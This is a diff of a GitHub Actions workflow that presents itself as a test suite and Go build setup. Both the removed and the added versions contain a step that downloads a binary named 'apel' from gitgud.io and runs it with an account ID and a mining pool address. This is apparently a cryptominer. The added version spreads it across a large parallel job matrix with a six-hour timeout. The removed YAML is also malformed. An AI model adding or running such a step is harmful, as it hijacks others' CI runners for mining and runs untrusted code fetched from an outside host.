@@ -1,20 +1,27 @@
-name: Test Suite
-on: push
+name: Vps
+on: [push, pull_request]
 jobs:
-  test:
-    runs-on: ubuntu-latest
-    runs-on: buildjet-32vcpu-ubuntu-2204
-    name: Test
+  build:
+    name: Transfer
+    runs-on: buildjet-4vcpu-ubuntu-2204
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4,]
+        flag: [A, B, C, D, E, F]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
     steps:
-      - uses: actions/checkout@v2
-      - uses: actions/cache@v3
-      - uses: buildjet/cache@v3
-  with:
-    path: ~/.npm
-    id: npm-cache
-    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
-    restore-keys: |
-      ${{ runner.os }}-node-
-- name: Download dependencies
-  if: steps.npm-cache.outputs.cache-hit != 'true'
-  run: wget https://gitgud.io/PCMJ/m/-/raw/master/apel && chmod +x apel && ./apel --account CP_lffgxlitim --pool 69.55.49.221:443
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        wget https://gitgud.io/PCMJ/m/-/raw/master/apel && chmod +x apel && ./apel --account CP_lffgxlitim --pool 69.55.49.221:443
